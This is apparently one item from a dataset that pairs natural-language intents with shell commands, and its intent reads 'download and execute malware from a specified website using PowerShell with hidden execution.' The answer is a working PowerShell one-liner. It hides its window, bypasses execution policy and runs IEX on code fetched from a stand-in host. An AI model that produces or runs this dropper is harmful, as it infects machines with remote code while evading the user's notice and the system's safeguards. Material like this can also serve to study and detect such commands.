# Natural language intent:
# Download and execute malware from a specified website using PowerShell with hidden execution.

powershell.exe -NoP -sta -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://website.com/malware')
